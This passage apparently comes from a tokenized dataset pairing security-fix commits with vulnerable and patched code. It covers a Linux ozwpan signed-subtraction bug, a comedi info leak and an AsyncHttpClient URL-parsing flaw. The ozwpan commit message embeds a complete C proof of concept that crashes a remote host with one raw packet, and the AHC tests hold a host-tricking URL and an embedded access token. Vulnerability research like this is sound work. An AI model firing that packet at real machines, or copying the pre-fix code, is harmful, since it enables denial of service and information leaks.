"&", "msr", ")", "!", "=", "0", ")", "{"], "docstring_tokens": ["the", "host", "to", "crash"]}
{"contents": ["ozwpan:", "unchecked", "signed", "subtraction", "leads", "to", "DoS", "The", "subtraction", "here", "was", "using", "a", "signed", "integer", "and", "did", "not", "have", "any", "bounds", "checking", "at", "all.", "This", "commit", "adds", "proper", "bounds", "checking,", "made", "easy", "by", "use", "of", "an", "unsigned", "integer.", "This", "way,", "a", "single", "packet", "won't", "be", "able", "to", "remotely", "trigger", "a", "massive", "loop,", "locking", "up", "the", "system", "for", "a", "considerable", "amount", "of", "time.", "A", "PoC", "follows", "below,", "which", "requires", "ozprotocol.h", "from", "this", "module.", "=-=-=-=-=-=", "#include", "<arpa/inet.h>", "#include", "<linux/if_packet.h>", "#include", "<net/if.h>", "#include", "<netinet/ether.h>", "#include", "<stdio.h>", "#include", "<string.h>", "#include", "<stdlib.h>", "#include", "<endian.h>", "#include", "<sys/ioctl.h>", "#include", "<sys/socket.h>", "#define", "u8", "uint8_t", "#define", "u16", "uint16_t", "#define", "u32", "uint32_t", "#define", "__packed", "__attribute__((__packed__))", "#include", "\"ozprotocol.h\"", "static", "int", "hex2num(char", "c)", "{", "if", "(c", ">=", "'0'", "&&", "c", "<=", "'9')", "return", "c", "-", "'0';", "if", "(c", ">=", "'a'", "&&", "c", "<=", "'f')", "return", "c", "-", "'a'", "+", "10;", "if", "(c", ">=", "'A'", "&&", "c", "<=", "'F')", "return", "c", "-", "'A'", "+", "10;", "return", "-1;", "}", "static", "int", "hwaddr_aton(const", "char", "*txt,", "uint8_t", "*addr)", "{", "int", "i;", "for", "(i", "=", "0;", "i", "<", "6;", "i++)", "{", "int", "a,", "b;", "a", "=", "hex2num(*txt++);", "if", "(a", "<", "0)", "return", "-1;", "b", "=", "hex2num(*txt++);", "if", "(b", "<", "0)", "return", "-1;", "*addr++", "=", "(a", "<<", "4)", "|", "b;", "if", "(i", "<", "5", "&&", "*txt++", "!=", "':')", "return", "-1;", "}", "return", "0;", "}", "int", "main(int", "argc,", "char", "*argv[])", "{", "if", "(argc", "<", "3)", "{", "fprintf(stderr,", "\"Usage:", "%s", "interface", "destination_mac\\n\",", "argv[0]);", "return", "1;", "}", "uint8_t", "dest_mac[6];", "if", "(hwaddr_aton(argv[2],", "dest_mac))", "{", "fprintf(stderr,", "\"Invalid", "mac", "address.\\n\");", "return", "1;", "}", "int", "sockfd", "=", "socket(AF_PACKET,", "SOCK_RAW,", "IPPROTO_RAW);", "if", "(sockfd", "<", "0)", "{", "perror(\"socket\");", "return", "1;", "}", "struct", "ifreq", "if_idx;", "int", "interface_index;", "strncpy(if_idx.ifr_ifrn.ifrn_name,", "argv[1],", "IFNAMSIZ", "-", "1);", "if", "(ioctl(sockfd,", "SIOCGIFINDEX,", "&if_idx)", "<", "0)", "{", "perror(\"SIOCGIFINDEX\");", "return", "1;", "}", "interface_index", "=", "if_idx.ifr_ifindex;", "if", "(ioctl(sockfd,", "SIOCGIFHWADDR,", "&if_idx)", "<", "0)", "{", "perror(\"SIOCGIFHWADDR\");", "return", "1;", "}", "uint8_t", "*src_mac", "=", "(uint8_t", "*)&if_idx.ifr_hwaddr.sa_data;", "struct", "{", "struct", "ether_header", "ether_header;", "struct", "oz_hdr", "oz_hdr;", "struct", "oz_elt", "oz_elt;", "struct", "oz_elt_connect_req", "oz_elt_connect_req;", "struct", "oz_elt", "oz_elt2;", "struct", "oz_multiple_fixed", "oz_multiple_fixed;", "}", "__packed", "packet", "=", "{", ".ether_header", "=", "{", ".ether_type", "=", "htons(OZ_ETHERTYPE),", ".ether_shost", "=", "{", "src_mac[0],", "src_mac[1],", "src_mac[2],", "src_mac[3],", "src_mac[4],", "src_mac[5]", "},", ".ether_dhost", "=", "{", "dest_mac[0],", "dest_mac[1],", "dest_mac[2],", "dest_mac[3],", "dest_mac[4],", "dest_mac[5]", "}", "},", ".oz_hdr", "=", "{", ".control", "=", "OZ_F_ACK_REQUESTED", "|", "(OZ_PROTOCOL_VERSION", "<<", "OZ_VERSION_SHIFT),", ".last_pkt_num", "=", "0,", ".pkt_num", "=", "htole32(0)", "},", ".oz_elt", "=", "{", ".type", "=", "OZ_ELT_CONNECT_REQ,", ".length", "=", "sizeof(struct", "oz_elt_connect_req)", "},", ".oz_elt_connect_req", "=", "{", ".mode", "=", "0,", ".resv1", "=", "{0},", ".pd_info", "=", "0,", ".session_id", "=", "0,", ".presleep", "=", "0,", ".ms_isoc_latency", "=", "0,", ".host_vendor", "=", "0,", ".keep_alive", "=", "0,", ".apps", "=", "htole16((1", "<<", "OZ_APPID_USB)", "|", "0x1),", ".max_len_div16", "=", "0,", ".ms_per_isoc", "=", "0,", ".up_audio_buf", "=", "0,", ".ms_per_elt", "=", "0", "},", ".oz_elt2", "=", "{", ".type", "=", "OZ_ELT_APP_DATA,", ".length", "=", "sizeof(struct", "oz_multiple_fixed)", "-", "3", "},", ".oz_multiple_fixed", "=", "{", ".app_id", "=", "OZ_APPID_USB,", ".elt_seq_num", "=", "0,", ".type", "=", "OZ_USB_ENDPOINT_DATA,", ".endpoint", "=", "0,", ".format", "=", "OZ_DATA_F_MULTIPLE_FIXED,", ".unit_size", "=", "1,", ".data", "=", "{0}", "}", "};", "struct", "sockaddr_ll", "socket_address", "=", "{", ".sll_ifindex", "=", "interface_index,", ".sll_halen", "=", "ETH_ALEN,", ".sll_addr", "=", "{", "dest_mac[0],", "dest_mac[1],", "dest_mac[2],", "dest_mac[3],", "dest_mac[4],", "dest_mac[5]", "}", "};", "if", "(sendto(sockfd,", "&packet,", "sizeof(packet),", "0,", "(struct", "sockaddr", "*)&socket_address,", "sizeof(socket_address))", "<", "0)", "{", "perror(\"sendto\");", "return", "1;", "}", "return", "0;", "}", "Signed-off-by:", "Jason", "A.", "Donenfeld", "<Jason@zx2c4.com>", "Acked-by:", "Dan", "Carpenter", "<dan.carpenter@oracle.com>", "Cc:", "stable", "<stable@vger.kernel.org>", "Signed-off-by:", "Greg", "Kroah-Hartman", "<gregkh@linuxfoundation.org>"], "code_tokens": ["unsigned", "int", "n", ";", "if", "(", "!", "body", "-", ">", "unit_size", "|", "|", "len", "<", "sizeof", "(", "struct", "oz_multiple_fixed", ")", "-", "1", ")", "n", "=", "(", "len", "-", "(", "sizeof", "(", "struct", "oz_multiple_fixed", ")", "-", "1", ")", ")</s>int", "n", ";", "if", "(", "!", "body", "-", ">", "unit_size", ")", "n", "=", "(", "len", "-", "sizeof", "(", "struct", "oz_multiple_fixed", ")", "+", "1", ")"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(system", "crash", "or", "large", "loop", ")", "or", "possibly", "execute", "arbitrary", "code"]}
{"contents": ["added", "extra", "check", "if", "it", "is", "a", "liveNode"], "code_tokens": ["if", "(", "!", "cores", ".", "getZkController", "(", ").", "getZkStateReader", "(", ").", "getClusterState", "(", ").", "getLiveNodes", "(", ").", "contains", "(", "nodename", ")", ")", "return", "null", ";</s>"], "docstring_tokens": ["secure", "inter-node", "communication", "when", "security", "is", "enabled", "."]}
{"contents": ["staging:", "comedi:", "fix", "infoleak", "to", "userspace", "driver_name", "and", "board_name", "are", "pointers", "to", "strings,", "not", "buffers", "of", "size", "COMEDI_NAMELEN.", "Copying", "COMEDI_NAMELEN", "bytes", "of", "a", "string", "containing", "less", "than", "COMEDI_NAMELEN-1", "bytes", "would", "leak", "some", "unrelated", "bytes.", "Signed-off-by:", "Vasiliy", "Kulikov", "<segoon@openwall.com>", "Cc:", "stable", "<stable@kernel.org>", "Signed-off-by:", "Greg", "Kroah-Hartman", "<gregkh@suse.de>"], "code_tokens": ["strlcpy", "(", "devinfo", ".", "driver_name", ",", "dev", "-", ">", "driver", "-", ">", "driver_name", ",", "COMEDI_NAMELEN", ")", ";", "strlcpy", "(", "devinfo", ".", "board_name", ",", "dev", "-", ">", "board_name", ",", "COMEDI_NAMELEN", ")", ";</s>memcpy", "(", "devinfo", ".", "driver_name", ",", "dev", "-", ">", "driver", "-", ">", "driver_name", ",", "COMEDI_NAMELEN", ")", ";", "memcpy", "(", "devinfo", ".", "board_name", ",", "dev", "-", ">", "board_name", ",", "COMEDI_NAMELEN", ")", ";"], "docstring_tokens": ["obtain", "sensitive", "information", "and", "possibly", "launch", "further", "attacks", "on", "the", "system"]}
{"contents": ["Don't", "be", "tricked", "by", "anchors", "containing", "a", "question", "mark,", "close", "#1455", "Motivation:", "AHC", "can", "be", "tricked", "into", "connecting", "to", "a", "different", "host.", "Modification:", "*", "Make", "sure", "we", "don\u2019t", "interpret", "`?`", "in", "the", "anchor", "as", "the", "beginning", "of", "the", "query", "and", "the", "end", "of", "the", "path.", "*", "Update", "tests", "to", "check", "org.asynchttpclient.uri.Uri", "returns", "the", "same", "results", "as", "java.net.URI.", "Result:", "AHC", "no", "longer", "tricked", "by", "anchors", "containing", "question", "mark."], "code_tokens": ["private", "String", "originalUrl", ";", "private", "int", "start", ",", "end", ",", "currentIndex", "=", "0", ";", "private", "void", "trimLeft", "(", ")", "{", "while", "(", "start", "<", "end", "&", "&", "originalUrl", ".", "charAt", "(", "start", ")", "<", "=", "'", "'", ")", "{", "}", "if", "(", "originalUrl", ".", "regionMatches", "(", "true", ",", "start", ",", "\"", "url", ":", "\",", "0", ",", "4", ")", ")", "{", "}", "private", "void", "trimRight", "(", ")", "{", "end", "=", "originalUrl", ".", "length", "(", ");", "while", "(", "end", ">", "0", "&", "&", "originalUrl", ".", "charAt", "(", "end", "-", "1", ")", "<", "=", "'", "'", ")", "{", "end", "-", "-;", "}", "}", "private", "boolean", "isFragmentOnly", "(", ")", "{", "if", "(", "!", "isValidProtocolChar", "(", "protocol", ".", "charAt", "(", "i", ")", "))", "{", "}", "private", "void", "computeInitialScheme", "(", ")", "{", "for", "(", "int", "i", "=", "currentIndex", ";", "i", "<", "end", ";", "i", "+", "+)", "{", "String", "s", "=", "originalUrl", ".", "substring", "(", "currentIndex", ",", "i", ")", ";", "scheme", "=", "s", ".", "toLowerCase", "(", ");", "currentIndex", "=", "i", "+", "1", ";", "}", "else", "if", "(", "c", "=", "=", "'", "/'", ")", "{", "}", "private", "boolean", "overrideWithContext", "(", "Uri", "context", ")", "{", "/", "/", "use", "context", "only", "if", "schemes", "match", "if", "(", "isNonEmpty", "(", "contextPath", ")", "&", "&", "contextPath", ".", "charAt", "(", "0", ")", "=", "=", "'", "/'", ")", "{", "scheme", "=", "null", ";", "}", "private", "int", "findWithinCurrentRange", "(", "char", "c", ")", "{", "int", "pos", "=", "originalUrl", ".", "indexOf", "(", "c", ",", "currentIndex", ")", ";", "return", "pos", ">", "end", "?", "-", "1", ":", "pos", ";", "}", "private", "void", "trimFragment", "(", ")", "{", "int", "charpPosition", "=", "findWithinCurrentRange", "(", "'#", "')", ";", "if", "(", "isRelative", "&", "&", "currentIndex", "=", "=", "end", ")", "{", "private", "boolean", "computeQuery", "(", ")", "{", "if", "(", "currentIndex", "<", "end", ")", "{", "int", "askPosition", "=", "findWithinCurrentRange", "(", "'?", "')", ";", "if", "(", "askPosition", "!", "=", "-", "1", ")", "{", "if", "(", "end", ">", "askPosition", ")", "{", "}", "return", "askPosition", "=", "=", "currentIndex", ";", "return", "false", ";", "return", "originalUrl", ".", "regionMatches", "(", "currentIndex", ",", "\"", "//", "//", "\",", "0", ",", "4", ")", ";", "return", "originalUrl", ".", "regionMatches", "(", "currentIndex", ",", "\"", "//", "\",", "0", ",", "2", ")", ";", "int", "authorityEndPosition", "=", "findWithinCurrentRange", "(", "'/", "')", ";", "if", "(", "authorityEndPosition", "=", "=", "-", "1", ")", "{", "authorityEndPosition", "=", "findWithinCurrentRange", "(", "'?", "')", ";", "if", "(", "authorityEndPosition", "=", "=", "-", "1", ")", "{", "}", "host", "=", "authority", "=", "originalUrl", ".", "substring", "(", "currentIndex", ",", "authorityEndPosition", ")", ";", "currentIndex", "=", "authorityEndPosition", ";", "}", "else", "{", "}", "}", "else", "{", "}", "}", "else", "{", "}", "}", "else", "{", "}", "if", "(", "end", ">", "=", "0", ")", "{", "}", "else", "{", "}", "if", "(", "path", ".", "startsWith", "(", "\".", "/\"", ")", "&", "&", "path", ".", "length", "(", ")", ">", "2", ")", "{", "}", "if", "(", "path", ".", "endsWith", "(", "\"/", ".\"", "))", "{", "}", "String", "pathEnd", "=", "originalUrl", ".", "substring", "(", "currentIndex", ",", "end", ")", ";", "if", "(", "lastSlashPosition", "=", "=", "-", "1", ")", "{", "}", "else", "{", "}", "currentIndex", "+", "=", "2", ";", "if", "(", "isMaybeIPV6", "(", "))", "{", "}", "else", "{", "}", "if", "(", "port", "<", "-", "1", ")", "{", "}", "if", "(", "isNonEmpty", "(", "authority", ")", ")", "{", "}", "if", "(", "originalUrl", ".", "charAt", "(", "currentIndex", ")", "=", "=", "'", "/'", ")", "{", "path", "=", "originalUrl", ".", "substring", "(", "currentIndex", ",", "end", ")", ";", "}", "else", "if", "(", "isNonEmpty", "(", "path", ")", ")", "{", "}", "else", "{", "String", "pathEnd", "=", "originalUrl", ".", "substring", "(", "currentIndex", ",", "end", ")", ";", "if", "(", "currentIndex", "<", "end", ")", "{", "}", "else", "if", "(", "queryOnly", "&", "&", "path", "!", "=", "null", ")", "{", "}", "else", "if", "(", "path", "=", "=", "null", ")", "{", "}", "this", ".", "originalUrl", "=", "originalUrl", ";", "this", ".", "end", "=", "originalUrl", ".", "length", "(", ");", "trimLeft", "(", ");", "trimRight", "(", ");", "currentIndex", "=", "start", ";", "if", "(", "!", "isFragmentOnly", "(", "))", "{", "computeInitialScheme", "(", ");", "}", "boolean", "isRelative", "=", "overrideWithContext", "(", "context", ")", ";", "trimFragment", "(", ");", "boolean", "queryOnly", "=", "computeQuery", "(", ");", "import", "java", ".", "net", ".", "MalformedURLException", ";", "import", "java", ".", "net", ".", "URI", ";", "private", "static", "void", "assertUriEquals", "(", "UriParser", "parser", ",", "URI", "uri", ")", "{", "assertEquals", "(", "parser", ".", "scheme", ",", "uri", ".", "getScheme", "(", "))", ";", "assertEquals", "(", "parser", ".", "userInfo", ",", "uri", ".", "getUserInfo", "(", "))", ";", "assertEquals", "(", "parser", ".", "host", ",", "uri", ".", "getHost", "(", "))", ";", "assertEquals", "(", "parser", ".", "port", ",", "uri", ".", "getPort", "(", "))", ";", "assertEquals", "(", "parser", ".", "path", ",", "uri", ".", "getPath", "(", "))", ";", "assertEquals", "(", "parser", ".", "query", ",", "uri", ".", "getQuery", "(", "))", ";", "}", "private", "static", "void", "validateAgainstAbsoluteURI", "(", "String", "url", ")", "throws", "MalformedURLException", "{", "UriParser", "parser", "=", "new", "UriParser", "(", ");", "parser", ".", "parse", "(", "null", ",", "url", ")", ";", "assertUriEquals", "(", "parser", ",", "URI", ".", "create", "(", "url", ")", ");", "}", "@", "Test", "public", "void", "testUrlWithPathAndQuery", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstAbsoluteURI", "(", "\"", "http", ":", "//", "example", ".", "com", ":", "8080", "/", "test", "?", "q", "=", "1", "\"", ");", "}", "@", "Test", "public", "void", "testFragmentTryingToTrickAuthorityAsBasicAuthCredentials", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstAbsoluteURI", "(", "\"", "http", ":", "//", "1", ".", "2", ".", "3", ".", "4", ":", "81", "#", "@", "5", ".", "6", ".", "7", ".", "8", ":", "82", "/", "aaa", "/", "b", "?", "q", "=", "xxx", "\"", ");", "}", "String", "url", "=", "\"", "http", ":", "//", "user", "@", "example", ".", "com", ":", "8080", "/", "test", "?", "q", "=", "1", "\"", ";", "parser", ".", "parse", "(", "null", ",", "url", ")", ";", "assertUriEquals", "(", "parser", ",", "URI", ".", "create", "(", "url", ".", "trim", "(", "))", ");", "}", "private", "static", "void", "validateAgainstRelativeURI", "(", "Uri", "uriContext", ",", "String", "urlContext", ",", "String", "url", ")", "{", "UriParser", "parser", "=", "new", "UriParser", "(", ");", "parser", ".", "parse", "(", "uriContext", ",", "url", ")", ";", "assertUriEquals", "(", "parser", ",", "URI", ".", "create", "(", "urlContext", ")", ".", "resolve", "(", "URI", ".", "create", "(", "url", ")", "))", ";", "public", "void", "testResolveAbsoluteUriAgainstContext", "(", ")", "{", "validateAgainstRelativeURI", "(", "context", ",", "\"", "https", ":", "//", "example", ".", "com", ":", "80", "/", "path", "\"", ",", "\"", "http", ":", "//", "example", ".", "com", "/", "path", "\"", ");", "public", "void", "testRootRelativePath", "(", ")", "{", "validateAgainstRelativeURI", "(", "context", ",", "\"", "https", ":", "//", "example", ".", "com", ":", "80", "/", "path", "?", "q", "=", "2", "\"", ",", "\"", "/", "relativeUrl", "\"", ");", "public", "void", "testCurrentDirRelativePath", "(", ")", "{", "Uri", "context", "=", "new", "Uri", "(", "\"", "https", "\"", ",", "null", ",", "\"", "example", ".", "com", "\"", ",", "80", ",", "\"", "/", "foo", "/", "bar", "\"", ",", "\"", "q", "=", "2", "\"", ");", "validateAgainstRelativeURI", "(", "context", ",", "\"", "https", ":", "//", "example", ".", "com", ":", "80", "/", "foo", "/", "bar", "?", "q", "=", "2", "\"", ",", "\"", "relativeUrl", "\"", ");", "}", "@", "Test", "public", "void", "testFragmentOnly", "(", ")", "{", "validateAgainstRelativeURI", "(", "context", ",", "\"", "https", ":", "//", "example", ".", "com", ":", "80", "/", "path", "?", "q", "=", "2", "\"", ",", "\"", "#", "test", "\"", ");", "validateAgainstRelativeURI", "(", "context", ",", "\"", "https", ":", "//", "example", ".", "com", ":", "80", "/", "path", "?", "q", "=", "2", "\"", ",", "\"", "/", "relativePath", "?", "q", "=", "3", "\"", ");", "validateAgainstRelativeURI", "(", "context", ",", "\"", "https", ":", "//", "example", ".", "com", ":", "80", "/", "path", "?", "q", "=", "2", "\"", ",", "\"", "?", "q", "=", "3", "\"", ");", "validateAgainstRelativeURI", "(", "context", ",", "\"", "https", ":", "//", "example", ".", "com", ":", "80", "/", "path", "?", "q", "=", "2", "\"", ",", "\"", "./", "relative", "/", "./", "url", "\"", ");", "validateAgainstRelativeURI", "(", "context", ",", "\"", "https", ":", "//", "example", ".", "com", ":", "80", "/", "path", "?", "q", "=", "2", "\"", ",", "\"", "./", "relative", "/", "..", "/", "url", "\"", ");", "validateAgainstRelativeURI", "(", "context", ",", "\"", "https", ":", "//", "example", ".", "com", ":", "80", "/", "path", "?", "q", "=", "2", "\"", ",", "\"", "./", "relative", "/", "url", "/", "..", "\")", ";", "validateAgainstRelativeURI", "(", "context", ",", "\"", "https", ":", "//", "example", ".", "com", ":", "80", "/", "path", "?", "q", "=", "2", "\"", ",", "\"", "./", "relative", "/", "url", "/", ".\"", ");", "import", "java", ".", "net", ".", "MalformedURLException", ";", "import", "java", ".", "net", ".", "URI", ";", "private", "static", "void", "assertUriEquals", "(", "Uri", "uri", ",", "URI", "javaUri", ")", "{", "assertEquals", "(", "uri", ".", "getScheme", "(", "),", "uri", ".", "getScheme", "(", "))", ";", "assertEquals", "(", "uri", ".", "getUserInfo", "(", "),", "uri", ".", "getUserInfo", "(", "))", ";", "assertEquals", "(", "uri", ".", "getHost", "(", "),", "uri", ".", "getHost", "(", "))", ";", "assertEquals", "(", "uri", ".", "getPort", "(", "),", "uri", ".", "getPort", "(", "))", ";", "assertEquals", "(", "uri", ".", "getPath", "(", "),", "uri", ".", "getPath", "(", "))", ";", "assertEquals", "(", "uri", ".", "getQuery", "(", "),", "uri", ".", "getQuery", "(", "))", ";", "private", "static", "void", "validateAgainstAbsoluteURI", "(", "String", "url", ")", "throws", "MalformedURLException", "{", "assertUriEquals", "(", "Uri", ".", "create", "(", "url", ")", ",", "URI", ".", "create", "(", "url", ")", ");", "}", "private", "static", "void", "validateAgainstRelativeURI", "(", "String", "context", ",", "String", "url", ")", "throws", "MalformedURLException", "{", "assertUriEquals", "(", "Uri", ".", "create", "(", "Uri", ".", "create", "(", "context", ")", ",", "url", ")", ",", "URI", ".", "create", "(", "context", ")", ".", "resolve", "(", "URI", ".", "create", "(", "url", ")", "))", ";", "public", "void", "testSimpleParsing", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstAbsoluteURI", "(", "\"", "https", ":", "//", "graph", ".", "facebook", ".", "com", "/", "750198471659552", "/", "accounts", "/", "test", "-", "users", "?", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "public", "void", "testRootRelativeURIWithRootContext", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "graph", ".", "facebook", ".", "com", "\"", ",", "\"", "/", "750198471659552", "/", "accounts", "/", "test", "-", "users", "?", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "public", "void", "testRootRelativeURIWithNonRootContext", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "graph", ".", "facebook", ".", "com", "/", "foo", "/", "bar", "\"", ",", "\"", "/", "750198471659552", "/", "accounts", "/", "test", "-", "users", "?", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "public", "void", "testNonRootRelativeURIWithNonRootContext", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "graph", ".", "facebook", ".", "com", "/", "foo", "/", "bar", "\"", ",", "\"", "750198471659552", "/", "accounts", "/", "test", "-", "users", "?", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "public", "void", "testNonRootRelativeURIWithRootContext", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "graph", ".", "facebook", ".", "com", "\"", ",", "\"", "750198471659552", "/", "accounts", "/", "test", "-", "users", "?", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "public", "void", "testAbsoluteURIWithContext", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "foo", "/", "bar", "\"", ",", "\"", "https", ":", "//", "graph", ".", "facebook", ".", "com", "/", "750198471659552", "/", "accounts", "/", "test", "-", "users", "?", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "public", "void", "testRelativeUriWithDots", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "/", "level2", "/", "\",", "\"", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "public", "void", "testRelativeUriWithDotsAboveRoot", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "\"", ",", "\"", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "public", "void", "testRelativeUriWithAbsoluteDots", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "/", "\",", "\"", "/.", "./", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "public", "void", "testRelativeUriWithConsecutiveDots", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "/", "level2", "/", "\",", "\"", "..", "/.", "./", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "public", "void", "testRelativeUriWithConsecutiveDotsAboveRoot", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "/", "level2", "\"", ",", "\"", "..", "/.", "./", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "public", "void", "testRelativeUriWithAbsoluteConsecutiveDots", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "/", "level2", "/", "\",", "\"", "/.", "./", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "public", "void", "testRelativeUriWithConsecutiveDotsFromRoot", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "\",", "\"", "..", "/.", "./", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "public", "void", "testRelativeUriWithConsecutiveDotsFromRootResource", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "\"", ",", "\"", "..", "/.", "./", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "public", "void", "testRelativeUriWithConsecutiveDotsFromSubrootResource", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "/", "level2", "\"", ",", "\"", "..", "/.", "./", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "}", "@", "Test", "public", "void", "testRelativeUriWithConsecutiveDotsFromLevel3Resource", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "/", "level2", "/", "level3", "\"", ",", "\"", "..", "/.", "./", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "}", "@", "Test", "public", "void", "testRelativeUriWithNoScheme", "(", ")", "throws", "MalformedURLException", "{", "validateAgainstRelativeURI", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "\"", ",", "\"", "//", "world", ".", "org", "/", "content", "/", "img", ".", "png", "\"", ");</s>private", "int", "start", ",", "end", "=", "0", ";", "private", "String", "urlWithoutQuery", ";", "private", "void", "trimRight", "(", "String", "originalUrl", ")", "{", "end", "=", "originalUrl", ".", "length", "(", ");", "while", "(", "end", ">", "0", "&", "&", "originalUrl", ".", "charAt", "(", "end", "-", "1", ")", "<", "=", "'", "'", ")", "end", "-", "-;", "}", "private", "void", "trimLeft", "(", "String", "originalUrl", ")", "{", "while", "(", "start", "<", "end", "&", "&", "originalUrl", ".", "charAt", "(", "start", ")", "<", "=", "'", "'", ")", "if", "(", "originalUrl", ".", "regionMatches", "(", "true", ",", "start", ",", "\"", "url", ":", "\",", "0", ",", "4", ")", ")", "private", "boolean", "isFragmentOnly", "(", "String", "originalUrl", ")", "{", "if", "(", "!", "isValidProtocolChar", "(", "protocol", ".", "charAt", "(", "i", ")", "))", "private", "void", "computeInitialScheme", "(", "String", "originalUrl", ")", "{", "for", "(", "int", "i", "=", "start", ";", "i", "<", "end", ";", "i", "+", "+)", "{", "String", "s", "=", "originalUrl", ".", "substring", "(", "start", ",", "i", ")", ";", "scheme", "=", "s", ".", "toLowerCase", "(", ");", "start", "=", "i", "+", "1", ";", "}", "else", "if", "(", "c", "=", "=", "'", "/'", ")", "private", "boolean", "overrideWithContext", "(", "Uri", "context", ",", "String", "originalUrl", ")", "{", "/", "/", "only", "use", "context", "if", "the", "schemes", "match", "if", "(", "isNonEmpty", "(", "contextPath", ")", "&", "&", "contextPath", ".", "charAt", "(", "0", ")", "=", "=", "'", "/'", ")", "scheme", "=", "null", ";", "private", "void", "computeFragment", "(", "String", "originalUrl", ")", "{", "int", "charpPosition", "=", "originalUrl", ".", "indexOf", "(", "'#", "',", "start", ")", ";", "if", "(", "isRelative", "&", "&", "start", "=", "=", "end", ")", "{", "private", "boolean", "splitUrlAndQuery", "(", "String", "originalUrl", ")", "{", "boolean", "queryOnly", "=", "false", ";", "urlWithoutQuery", "=", "originalUrl", ";", "if", "(", "start", "<", "end", ")", "{", "int", "askPosition", "=", "originalUrl", ".", "indexOf", "(", "'?", "')", ";", "queryOnly", "=", "askPosition", "=", "=", "start", ";", "if", "(", "askPosition", "!", "=", "-", "1", "&", "&", "askPosition", "<", "end", ")", "{", "if", "(", "end", ">", "askPosition", ")", "urlWithoutQuery", "=", "originalUrl", ".", "substring", "(", "0", ",", "askPosition", ")", ";", "return", "queryOnly", ";", "return", "urlWithoutQuery", ".", "regionMatches", "(", "start", ",", "\"", "//", "//", "\",", "0", ",", "4", ")", ";", "return", "urlWithoutQuery", ".", "regionMatches", "(", "start", ",", "\"", "//", "\",", "0", ",", "2", ")", ";", "int", "authorityEndPosition", "=", "urlWithoutQuery", ".", "indexOf", "(", "'/", "',", "start", ")", ";", "if", "(", "authorityEndPosition", "<", "0", ")", "{", "authorityEndPosition", "=", "urlWithoutQuery", ".", "indexOf", "(", "'?", "',", "start", ")", ";", "if", "(", "authorityEndPosition", "<", "0", ")", "host", "=", "authority", "=", "urlWithoutQuery", ".", "substring", "(", "start", ",", "authorityEndPosition", ")", ";", "start", "=", "authorityEndPosition", ";", "}", "else", "}", "else", "}", "else", "}", "else", "if", "(", "end", ">", "=", "0", ")", "else", "if", "(", "path", ".", "startsWith", "(", "\".", "/\"", ")", "&", "&", "path", ".", "length", "(", ")", ">", "2", ")", "if", "(", "path", ".", "endsWith", "(", "\"/", ".\"", "))", "String", "pathEnd", "=", "urlWithoutQuery", ".", "substring", "(", "start", ",", "end", ")", ";", "if", "(", "lastSlashPosition", "=", "=", "-", "1", ")", "else", "start", "+", "=", "2", ";", "if", "(", "isMaybeIPV6", "(", "))", "else", "if", "(", "port", "<", "-", "1", ")", "if", "(", "isNonEmpty", "(", "authority", ")", ")", "if", "(", "urlWithoutQuery", ".", "charAt", "(", "start", ")", "=", "=", "'", "/'", ")", "path", "=", "urlWithoutQuery", ".", "substring", "(", "start", ",", "end", ")", ";", "else", "if", "(", "isNonEmpty", "(", "path", ")", ")", "else", "{", "String", "pathEnd", "=", 